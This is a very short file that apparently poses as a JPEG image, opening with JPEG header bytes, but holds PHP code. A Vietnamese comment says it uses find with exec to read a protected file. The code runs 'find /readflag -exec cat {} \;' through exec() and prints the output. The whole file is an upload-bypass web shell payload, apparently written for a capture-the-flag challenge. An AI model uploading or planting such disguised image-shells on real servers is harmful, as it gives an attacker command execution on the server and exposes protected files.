ÿØÿà
<?php
// Sử dụng find với exec để đọc file được bảo vệ
exec("find /readflag -exec cat {} \\;", $output);
var_dump($output);
?>
